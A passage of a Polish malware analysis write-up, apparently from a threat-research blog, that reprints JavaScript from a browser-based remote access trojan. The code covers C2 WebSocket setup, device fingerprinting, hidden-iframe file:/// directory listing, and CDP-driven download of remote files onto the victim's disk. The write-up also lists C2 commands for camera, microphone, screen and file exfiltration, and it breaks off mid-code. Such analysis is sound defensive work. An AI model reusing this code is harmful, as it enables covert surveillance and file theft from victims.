+<span class="line"><span style="color:#E1E4E8">async </span><span style="color:#B392F0">getWebSocketUrl</span><span style="color:#E1E4E8">() {</span></span>
+<span class="line"><span style="color:#F97583">    try</span><span style="color:#E1E4E8"> {</span></span>
+<span class="line"><span style="color:#F97583">        const</span><span style="color:#79B8FF"> url</span><span style="color:#F97583"> =</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">await</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">await</span><span style="color:#B392F0"> fetch</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">CONFIG_URL</span><span style="color:#E1E4E8">)).</span><span style="color:#B392F0">text</span><span style="color:#E1E4E8">()).</span><span style="color:#B392F0">trim</span><span style="color:#E1E4E8">().</span><span style="color:#B392F0">replace</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">/</span><span style="color:#85E89D;font-weight:bold">\/</span><span style="color:#F97583">$</span><span style="color:#9ECBFF">/</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">''</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#F97583">        return</span><span style="color:#E1E4E8"> url.</span><span style="color:#B392F0">endsWith</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'/ws'</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">?</span><span style="color:#E1E4E8"> url </span><span style="color:#F97583">:</span><span style="color:#E1E4E8"> url </span><span style="color:#F97583">+</span><span style="color:#9ECBFF"> '/ws'</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">    } </span><span style="color:#F97583">catch</span><span style="color:#E1E4E8"> {</span></span>
+<span class="line"><span style="color:#F97583">        return</span><span style="color:#9ECBFF"> 'ws://127.0.0.1:6341/ws'</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">}</span></span></code></pre>
+<p>Następnie inicjalizowane są wszystkie komponenty funkcjonalne, po czym generowany jest fingerprint ofiary oraz określany jest kod kraju.</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="js"><code><span class="line"><span style="color:#B392F0">generateFingerprint</span><span style="color:#E1E4E8">() {</span></span>
+<span class="line"><span style="color:#F97583">    const</span><span style="color:#79B8FF"> stored</span><span style="color:#F97583"> =</span><span style="color:#E1E4E8"> localStorage.</span><span style="color:#B392F0">getItem</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">STORAGE_KEY</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> (stored) </span><span style="color:#F97583">return</span><span style="color:#E1E4E8"> stored;</span></span>
+<span class="line"><span style="color:#F97583">    const</span><span style="color:#79B8FF"> canvas</span><span style="color:#F97583"> =</span><span style="color:#E1E4E8"> document.</span><span style="color:#B392F0">createElement</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'canvas'</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#F97583">    const</span><span style="color:#79B8FF"> ctx</span><span style="color:#F97583"> =</span><span style="color:#E1E4E8"> canvas.</span><span style="color:#B392F0">getContext</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'2d'</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">    Object.</span><span style="color:#B392F0">assign</span><span style="color:#E1E4E8">(ctx, { textBaseline: </span><span style="color:#9ECBFF">'top'</span><span style="color:#E1E4E8">, font: </span><span style="color:#9ECBFF">'14px Arial'</span><span style="color:#E1E4E8">, fillStyle: </span><span style="color:#9ECBFF">'#f60'</span><span style="color:#E1E4E8"> });</span></span>
+<span class="line"><span style="color:#E1E4E8">    ctx.</span><span style="color:#B392F0">fillRect</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">125</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">62</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">20</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">    ctx.fillStyle </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> '#069'</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">    ctx.</span><span style="color:#B392F0">fillText</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'Hello, world!'</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">2</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">15</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#F97583">    const</span><span style="color:#79B8FF"> rawHash</span><span style="color:#F97583"> =</span><span style="color:#E1E4E8"> [</span></span>
+<span class="line"><span style="color:#E1E4E8">        canvas.</span><span style="color:#B392F0">toDataURL</span><span style="color:#E1E4E8">(),</span></span>
+<span class="line"><span style="color:#E1E4E8">        screen.width </span><span style="color:#F97583">+</span><span style="color:#9ECBFF"> 'x'</span><span style="color:#F97583"> +</span><span style="color:#E1E4E8"> screen.height </span><span style="color:#F97583">+</span><span style="color:#9ECBFF"> 'x'</span><span style="color:#F97583"> +</span><span style="color:#E1E4E8"> screen.colorDepth,</span></span>
+<span class="line"><span style="color:#E1E4E8">        navigator.userAgent,</span></span>
+<span class="line"><span style="color:#E1E4E8">        navigator.language,</span></span>
+<span class="line"><span style="color:#F97583">        new</span><span style="color:#B392F0"> Date</span><span style="color:#E1E4E8">().</span><span style="color:#B392F0">getTimezoneOffset</span><span style="color:#E1E4E8">(),</span></span>
+<span class="line"><span style="color:#E1E4E8">        navigator.hardwareConcurrency </span><span style="color:#F97583">??</span><span style="color:#9ECBFF"> 'unknown'</span><span style="color:#E1E4E8">,</span></span>
+<span class="line"><span style="color:#E1E4E8">        navigator.platform</span></span>
+<span class="line"><span style="color:#E1E4E8">    ].</span><span style="color:#B392F0">join</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'|'</span><span style="color:#E1E4E8">).</span><span style="color:#B392F0">split</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">''</span><span style="color:#E1E4E8">).</span><span style="color:#B392F0">reduce</span><span style="color:#E1E4E8">((</span><span style="color:#FFAB70">acc</span><span style="color:#E1E4E8">, </span><span style="color:#FFAB70">ch</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">=></span><span style="color:#E1E4E8"> (acc </span><span style="color:#F97583">&#x3C;&#x3C;</span><span style="color:#79B8FF"> 5</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">-</span><span style="color:#E1E4E8"> acc </span><span style="color:#F97583">+</span><span style="color:#E1E4E8"> ch.</span><span style="color:#B392F0">charCodeAt</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">|</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#F97583">    const</span><span style="color:#79B8FF"> fingerprint</span><span style="color:#F97583"> =</span><span style="color:#E1E4E8"> Math.</span><span style="color:#B392F0">abs</span><span style="color:#E1E4E8">(rawHash).</span><span style="color:#B392F0">toString</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">36</span><span style="color:#E1E4E8">).</span><span style="color:#B392F0">padStart</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">8</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">'0'</span><span style="color:#E1E4E8">).</span><span style="color:#B392F0">slice</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">8</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">    localStorage.</span><span style="color:#B392F0">setItem</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">STORAGE_KEY</span><span style="color:#E1E4E8">, fingerprint);</span></span>
+<span class="line"><span style="color:#F97583">    return</span><span style="color:#E1E4E8"> fingerprint;</span></span>
+<span class="line"><span style="color:#E1E4E8">},</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#B392F0">detectCountry</span><span style="color:#E1E4E8">: () </span><span style="color:#F97583">=></span><span style="color:#79B8FF"> TIMEZONE_MAP</span><span style="color:#E1E4E8">[Intl.</span><span style="color:#B392F0">DateTimeFormat</span><span style="color:#E1E4E8">().</span><span style="color:#B392F0">resolvedOptions</span><span style="color:#E1E4E8">().timeZone] </span><span style="color:#F97583">??</span><span style="color:#9ECBFF"> 'US'</span><span style="color:#E1E4E8">,</span></span></code></pre>
+<p>Realizowane jest to za pomocą funkcji <code>generateFingerprint()</code> oraz <code>detectCountry()</code>. Pierwsza z nich najpierw próbuje odczytać wartość z <code>localStorage</code> spod klucza <code>STORAGE_KEY</code>. Jeżeli wartość już istnieje, zostaje natychmiast zwrócona. W przeciwnym wypadku funkcja przechodzi do generowania fingerprintu ofiary na podstawie cech przeglądarki i urządzenia. W tym celu wykorzystywany jest odcisk canvas oraz zestaw cech środowiskowych obejmujący rozdzielczość i głębię kolorów ekranu, <code>userAgent</code>, język przeglądarki, offset strefy czasowej, liczbę logicznych rdzeni CPU oraz platformę systemową. Zebrane wartości są łączone w jeden łańcuch znaków, a następnie redukowane do 32-bitowego hasha za pomocą prostego deterministycznego algorytmu. Otrzymany wynik zostaje przekształcony do postaci 8-znakowego identyfikatora w formacie base36 i zapisany w <code>localStorage</code>, co umożliwia ponowne rozpoznanie tego samego klienta w kolejnych sesjach.</p>
+<p>Druga funkcja, <code>detectCountry()</code>, określa kod kraju na podstawie strefy czasowej ustawionej w systemie. Wartości te pobierane są ze zdefiniowanej wcześniej mapy stref czasowych do kodów państw, a w przypadku braku dopasowania ustawiana jest wartość domyślna <code>US</code>.</p>
+<p>Po wykonaniu tych operacji dochodzi do ustanowienia połączenia z serwerem C2, a następnie przesyłana jest wiadomość <code>register</code>, zawierająca zgromadzone artefakty identyfikujące klienta, i zostaje uruchomiony streaming ekranu.</p>
+<h3 id="wykorzystywane-polecenia-c2">Wykorzystywane polecenia C2</h3>
+<ul>
+<li><code>quality</code> — zmiana jakości streamu ekranu,</li>
+<li><code>quality_camera</code> — zmiana jakości streamu kamery,</li>
+<li><code>camera_start</code> — inicjalizacja kamery,</li>
+<li><code>camera_resume</code> — wznowienie kamery,</li>
+<li><code>camera_pause</code> — wstrzymanie kamery,</li>
+<li><code>camera_stop</code> — zatrzymanie kamery,</li>
+<li><code>mic_start</code> — uruchomienie mikrofonu,</li>
+<li><code>mic_stop</code> — zatrzymanie mikrofonu,</li>
+<li><code>mic_noise_suppression</code> — zmiana redukcji szumu,</li>
+<li><code>file_list_request</code> — listowanie katalogu,</li>
+<li><code>file_download</code> — odczyt i wysyłka pliku,</li>
+<li><code>file_upload</code> — zapis pliku na hoście,</li>
+<li><code>file_scan_recursive</code> — rekursywne skanowanie plików,</li>
+<li><code>archive_download</code> — zbiorczy transfer plików,</li>
+<li><code>heartbeat_ack</code> — odpowiedź na komunikat heartbeat.</li>
+</ul>
+<h3 id="wykorzystywane-typy-komunikatów-wysyłanych-przez-klienta">Wykorzystywane typy komunikatów wysyłanych przez klienta</h3>
+<ul>
+<li><code>register</code> — rejestracja klienta,</li>
+<li><code>heartbeat</code> — sygnał podtrzymania połączenia,</li>
+<li><code>frame</code> — klatka ekranu,</li>
+<li><code>frame_camera</code> — klatka z kamery,</li>
+<li><code>camera_error</code> — błąd kamery,</li>
+<li><code>file_list</code> — wynik listowania katalogu,</li>
+<li><code>file_data</code> — cały plik w jednej wiadomości,</li>
+<li><code>file_chunk</code> — fragment pliku,</li>
+<li><code>file_complete</code> — zakończenie transferu pliku,</li>
+<li><code>file_upload_success</code> — rozpoczęcie zapisu pliku,</li>
+<li><code>file_error</code> — błąd operacji plikowej,</li>
+<li><code>scan_progress</code> — postęp skanowania rekursywnego katalogów,</li>
+<li><code>scan_complete</code> — zakończenie skanowania rekursywnego katalogów,</li>
+<li><code>archive_progress</code> — postęp transferu zbiorczego,</li>
+<li><code>archive_file_skipped</code> — pominięty plik podczas transferu zbiorczego,</li>
+<li><code>archive_download_complete</code> — zakończenie transferu zbiorczego,</li>
+<li><code>audio_data</code> — próbki audio z mikrofonu,</li>
+<li><code>mic_started</code> — uruchomienie mikrofonu,</li>
+<li><code>mic_stopped</code> — zatrzymanie mikrofonu,</li>
+<li><code>mic_error</code> — błąd mikrofonu.</li>
+</ul>
+<h3 id="liczy-się-wnętrze--ciekawe-implementacje-wybranych-modułów">Liczy się wnętrze — ciekawe implementacje wybranych modułów.</h3>
+<h4 id="moduł-przeglądania-plików">Moduł przeglądania plików</h4>
+<p>Mechanizm przeglądania plików jest realizowany przez właściwy komponent we współpracy z klasą <code>IframeFileReader.loadDirectory()</code>.</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="js"><code><span class="line"><span style="color:#E1E4E8">static </span><span style="color:#B392F0">loadDirectory</span><span style="color:#E1E4E8">(path, timeout </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 3000</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#F97583">    return</span><span style="color:#F97583"> new</span><span style="color:#79B8FF"> Promise</span><span style="color:#E1E4E8">((</span><span style="color:#FFAB70">resolve</span><span style="color:#E1E4E8">, </span><span style="color:#FFAB70">reject</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">=></span><span style="color:#E1E4E8"> {</span></span>
+<span class="line"><span style="color:#F97583">        const</span><span style="color:#79B8FF"> iframe</span><span style="color:#F97583"> =</span><span style="color:#E1E4E8"> document.</span><span style="color:#B392F0">createElement</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'iframe'</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">        iframe.style.display </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> 'none'</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#F97583">        try</span><span style="color:#E1E4E8"> {</span></span>
+<span class="line"><span style="color:#E1E4E8">            iframe.src </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> Utils.</span><span style="color:#B392F0">normalizeFilePath</span><span style="color:#E1E4E8">(path);</span></span>
+<span class="line"><span style="color:#E1E4E8">        } </span><span style="color:#F97583">catch</span><span style="color:#E1E4E8"> (err) {</span></span>
+<span class="line"><span style="color:#F97583">            return</span><span style="color:#B392F0"> reject</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">new</span><span style="color:#B392F0"> Error</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'Invalid path: '</span><span style="color:#F97583"> +</span><span style="color:#E1E4E8"> err.message));</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">        document.body.</span><span style="color:#B392F0">appendChild</span><span style="color:#E1E4E8">(iframe);</span></span>
+<span class="line"><span style="color:#F97583">        const</span><span style="color:#79B8FF"> timer</span><span style="color:#F97583"> =</span><span style="color:#B392F0"> setTimeout</span><span style="color:#E1E4E8">(() </span><span style="color:#F97583">=></span><span style="color:#E1E4E8"> {</span></span>
+<span class="line"><span style="color:#E1E4E8">            iframe.</span><span style="color:#B392F0">remove</span><span style="color:#E1E4E8">();</span></span>
+<span class="line"><span style="color:#B392F0">            reject</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">new</span><span style="color:#B392F0"> Error</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'Access denied or timeout'</span><span style="color:#E1E4E8">));</span></span>
+<span class="line"><span style="color:#E1E4E8">        }, timeout);</span></span>
+<span class="line"><span style="color:#E1E4E8">        iframe.</span><span style="color:#B392F0">onload</span><span style="color:#F97583"> =</span><span style="color:#E1E4E8"> () </span><span style="color:#F97583">=></span><span style="color:#E1E4E8"> {</span></span>
+<span class="line"><span style="color:#B392F0">            clearTimeout</span><span style="color:#E1E4E8">(timer);</span></span>
+<span class="line"><span style="color:#F97583">            try</span><span style="color:#E1E4E8"> {</span></span>
+<span class="line"><span style="color:#F97583">                if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#E1E4E8">iframe.contentDocument) {</span></span>
+<span class="line"><span style="color:#E1E4E8">                    iframe.</span><span style="color:#B392F0">remove</span><span style="color:#E1E4E8">();</span></span>
+<span class="line"><span style="color:#F97583">                    return</span><span style="color:#B392F0"> reject</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">new</span><span style="color:#B392F0"> Error</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'Access denied'</span><span style="color:#E1E4E8">));</span></span>
+<span class="line"><span style="color:#E1E4E8">                }</span></span>
+<span class="line"><span style="color:#F97583">                const</span><span style="color:#79B8FF"> files</span><span style="color:#F97583"> =</span><span style="color:#E1E4E8"> IframeFileReader.</span><span style="color:#B392F0">parseDirectoryListing</span><span style="color:#E1E4E8">(iframe.contentDocument, path);</span></span>
+<span class="line"><span style="color:#E1E4E8">                iframe.</span><span style="color:#B392F0">remove</span><span style="color:#E1E4E8">();</span></span>
+<span class="line"><span style="color:#B392F0">                resolve</span><span style="color:#E1E4E8">(files);</span></span>
+<span class="line"><span style="color:#E1E4E8">            } </span><span style="color:#F97583">catch</span><span style="color:#E1E4E8"> (err) {</span></span>
+<span class="line"><span style="color:#E1E4E8">                iframe.</span><span style="color:#B392F0">remove</span><span style="color:#E1E4E8">();</span></span>
+<span class="line"><span style="color:#B392F0">                reject</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">new</span><span style="color:#B392F0"> Error</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'Access denied: '</span><span style="color:#F97583"> +</span><span style="color:#E1E4E8"> err.message));</span></span>
+<span class="line"><span style="color:#E1E4E8">            }</span></span>
+<span class="line"><span style="color:#E1E4E8">        };</span></span>
+<span class="line"><span style="color:#E1E4E8">        iframe.</span><span style="color:#B392F0">onerror</span><span style="color:#F97583"> =</span><span style="color:#E1E4E8"> () </span><span style="color:#F97583">=></span><span style="color:#E1E4E8"> {</span></span>
+<span class="line"><span style="color:#B392F0">            clearTimeout</span><span style="color:#E1E4E8">(timer);</span></span>
+<span class="line"><span style="color:#E1E4E8">            iframe.</span><span style="color:#B392F0">remove</span><span style="color:#E1E4E8">();</span></span>
+<span class="line"><span style="color:#B392F0">            reject</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">new</span><span style="color:#B392F0"> Error</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'Access denied'</span><span style="color:#E1E4E8">));</span></span>
+<span class="line"><span style="color:#E1E4E8">        };</span></span>
+<span class="line"><span style="color:#E1E4E8">    });</span></span>
+<span class="line"><span style="color:#E1E4E8">}</span></span></code></pre>
+<p>Po otrzymaniu z serwera komendy <code>file_list_request</code> realizowana jest normalizacja ścieżki wejściowej do postaci URI <code>file:///</code>, a następnie osadzana jest ona w ukrytym elemencie <code>iframe</code>, dodawanym dynamicznie do dokumentu HTML. Po załadowaniu zawartości <code>iframe</code> próbka sprawdza, czy dostępny jest obiekt <code>contentDocument</code>. Jeżeli dostęp zostanie uzyskany, kod interpretuje widok katalogu jako dokument HTML i rozpoczyna jego parsowanie.</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="js"><code><span class="line"><span style="color:#E1E4E8">static </span><span style="color:#B392F0">parseDirectoryListing</span><span style="color:#E1E4E8">(doc, dirPath) {</span></span>
+<span class="line"><span style="color:#F97583">    return</span><span style="color:#E1E4E8"> Array.</span><span style="color:#B392F0">from</span><span style="color:#E1E4E8">(doc.</span><span style="color:#B392F0">querySelectorAll</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'tr'</span><span style="color:#E1E4E8">)).</span><span style="color:#B392F0">map</span><span style="color:#E1E4E8">(</span><span style="color:#FFAB70">row</span><span style="color:#F97583"> =></span><span style="color:#E1E4E8"> {</span></span>
+<span class="line"><span style="color:#F97583">        const</span><span style="color:#79B8FF"> cells</span><span style="color:#F97583"> =</span><span style="color:#E1E4E8"> row.</span><span style="color:#B392F0">querySelectorAll</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'td'</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (cells.</span><span style="color:#79B8FF">length</span><span style="color:#F97583"> &#x3C;</span><span style="color:#79B8FF"> 3</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">return</span><span style="color:#79B8FF"> null</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#F97583">        const</span><span style="color:#79B8FF"> link</span><span style="color:#F97583"> =</span><span style="color:#E1E4E8"> cells[</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">].</span><span style="color:#B392F0">querySelector</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'a'</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#E1E4E8">link) </span><span style="color:#F97583">return</span><span style="color:#79B8FF"> null</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#F97583">        const</span><span style="color:#79B8FF"> name</span><span style="color:#F97583"> =</span><span style="color:#E1E4E8"> link.textContent.</span><span style="color:#B392F0">trim</span><span style="color:#E1E4E8">();</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> ([</span><span style="color:#9ECBFF">'[Parent Directory]'</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">'.'</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">'..'</span><span style="color:#E1E4E8">].</span><span style="color:#B392F0">includes</span><span style="color:#E1E4E8">(name)) </span><span style="color:#F97583">return</span><span style="color:#79B8FF"> null</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#F97583">        return</span><span style="color:#E1E4E8"> {</span></span>
+<span class="line"><span style="color:#E1E4E8">            name,</span></span>
+<span class="line"><span style="color:#E1E4E8">            path: dirPath.</span><span style="color:#B392F0">replace</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">/</span><span style="color:#79B8FF">[</span><span style="color:#85E89D;font-weight:bold">\\</span><span style="color:#79B8FF">/]</span><span style="color:#F97583">+$</span><span style="color:#9ECBFF">/</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">''</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">+</span><span style="color:#9ECBFF"> '/'</span><span style="color:#F97583"> +</span><span style="color:#E1E4E8"> name,</span></span>
+<span class="line"><span style="color:#E1E4E8">            isDir: link.</span><span style="color:#B392F0">getAttribute</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'href'</span><span style="color:#E1E4E8">).</span><span style="color:#B392F0">endsWith</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'/'</span><span style="color:#E1E4E8">),</span></span>
+<span class="line"><span style="color:#E1E4E8">            size: cells[</span><span style="color:#79B8FF">2</span><span style="color:#E1E4E8">]?.textContent.</span><span style="color:#B392F0">trim</span><span style="color:#E1E4E8">() </span><span style="color:#F97583">||</span><span style="color:#9ECBFF"> ''</span><span style="color:#E1E4E8">,</span></span>
+<span class="line"><span style="color:#E1E4E8">            date: cells[</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">]?.textContent.</span><span style="color:#B392F0">trim</span><span style="color:#E1E4E8">() </span><span style="color:#F97583">||</span><span style="color:#9ECBFF"> ''</span></span>
+<span class="line"><span style="color:#E1E4E8">        };</span></span>
+<span class="line"><span style="color:#E1E4E8">    }).</span><span style="color:#B392F0">filter</span><span style="color:#E1E4E8">(Boolean);</span></span>
+<span class="line"><span style="color:#E1E4E8">}</span></span></code></pre>
+<p>W praktyce wykonywane jest przeszukiwanie wierszy tabeli (<code>tr</code>), z których odczytywane są nazwy plików i katalogów, ich ścieżki, rozmiary oraz daty. Jednocześnie pomijane są wpisy techniczne, takie jak <code>[Parent Directory]</code>, <code>.</code> oraz <code>..</code>, aby wynik odpowiadał rzeczywistej zawartości katalogu.<br>
+Tak uzyskane dane są następnie pakowane do struktury zawierającej m.in. nazwę, pełną ścieżkę, informację o tym, czy dany wpis jest katalogiem, rozmiar oraz datę, po czym odsyłane do serwera w komunikacie <code>file_list</code>.</p>
+<h4 id="moduł-uploadfile">Moduł “uploadFile”</h4>
+<p>Funkcja <code>uploadFile(url, path)</code> jest nazwana myląco, ponieważ w rzeczywistości nie realizuje uploadu pliku do serwera. Jej faktycznym celem jest pobranie wskazanego pliku z adresu zdalnego i zapisania go lokalnie na hoście ofiary we wskazanej lokalizacji. Funkcja ta jest wywoływana po otrzymaniu komendy <code>file_upload</code>, zawierającej adres URL pliku oraz ścieżkę docelową.</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="js"><code><span class="line"><span style="color:#E1E4E8">async </span><span style="color:#B392F0">uploadFile</span><span style="color:#E1E4E8">(url, downloadPath) {</span></span>
+<span class="line"><span style="color:#F97583">    try</span><span style="color:#E1E4E8"> {</span></span>
+<span class="line"><span style="color:#F97583">        const</span><span style="color:#79B8FF"> normalizedPath</span><span style="color:#F97583"> =</span><span style="color:#E1E4E8"> downloadPath.</span><span style="color:#B392F0">replace</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">/</span><span style="color:#85E89D;font-weight:bold">\/</span><span style="color:#9ECBFF">/</span><span style="color:#F97583">g</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">'</span><span style="color:#79B8FF">\\</span><span style="color:#9ECBFF">'</span><span style="color:#E1E4E8">).</span><span style="color:#B392F0">replace</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">/</span><span style="color:#85E89D;font-weight:bold">\/</span><span style="color:#F97583">+$</span><span style="color:#9ECBFF">/</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">''</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#F97583">        const</span><span style="color:#79B8FF"> cdp</span><span style="color:#F97583"> =</span><span style="color:#F97583"> await</span><span style="color:#E1E4E8"> CDPClient.</span><span style="color:#B392F0">connect</span><span style="color:#E1E4E8">();</span></span>
+<span class="line"><span style="color:#F97583">        await</span><span style="color:#E1E4E8"> cdp.</span><span style="color:#B392F0">send</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'Browser.setDownloadBehavior'</span><span style="color:#E1E4E8">, { behavior: </span><span style="color:#9ECBFF">'allow'</span><span style="color:#E1E4E8">, downloadPath: normalizedPath, eventsEnabled: </span><span style="color:#79B8FF">true</span><span style="color:#E1E4E8"> });</span></span>
+<span class="line"><span style="color:#F97583">        const</span><span style="color:#E1E4E8"> { </span><span style="color:#79B8FF">targetInfos</span><span style="color:#E1E4E8"> } </span><span style="color:#F97583">=</span><span style="color:#F97583"> await</span><span style="color:#E1E4E8"> cdp.</span><span style="color:#B392F0">send</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'Target.getTargets'</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#F97583">        const</span><span style="color:#79B8FF"> pageTarget</span><span style="color:#F97583"> =</span><span style="color:#E1E4E8"> targetInfos.</span><span style="color:#B392F0">find</span><span style="color:#E1E4E8">(</span><span style="color:#FFAB70">tgt</span><span style="color:#F97583"> =></span><span style="color:#E1E4E8"> tgt.type </span><span style="color:#F97583">===</span><span style="color:#9ECBFF"> 'page'</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#E1E4E8">pageTarget) </span><span style="color:#F97583">throw</span><span style="color:#F97583"> new</span><span style="color:#B392F0"> Error</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'No page target found'</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#F97583">        const</span><span style="color:#E1E4E8"> { </span><span style="color:#79B8FF">sessionId</span><span style="color:#E1E4E8"> } </span><span style="color:#F97583">=</span><span style="color:#F97583"> await</span><span style="color:#E1E4E8"> cdp.</span><span style="color:#B392F0">send</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'Target.attachToTarget'</span><span style="color:#E1E4E8">, { targetId: pageTarget.targetId, flatten: </span><span style="color:#79B8FF">true</span><span style="color:#E1E4E8"> });</span></span>
+<span class="line"><span style="color:#F97583">        await</span><span style="color:#E1E4E8"> cdp.</span><span style="color:#B392F0">send</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'Runtime.enable'</span><span style="color:#E1E4E8">, {}, sessionId);</span></span>
+<span class="line"><span style="color:#F97583">        await</span><span style="color:#E1E4E8"> cdp.</span><span style="color:#B392F0">send</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'Runtime.evaluate'</span><span style="color:#E1E4E8">, {</span></span>
+<span class="line"><span style="color:#E1E4E8">            expression: </span><span style="color:#9ECBFF">`(function() {</span></span>
+<span class="line"><span style="color:#9ECBFF">                try {</span></span>
+<span class="line"><span style="color:#9ECBFF">                    var a = document.createElement('a');</span></span>
+<span class="line"><span style="color:#9ECBFF">                    a.href = '${</span><span style="color:#E1E4E8">url</span><span style="color:#9ECBFF">}';</span></span>
+<span class="line"><span style="color:#9ECBFF">                    a.download = '';</span></span>
+<span class="line"><span style="color:#9ECBFF">                    a.target = '_blank';</span></span>
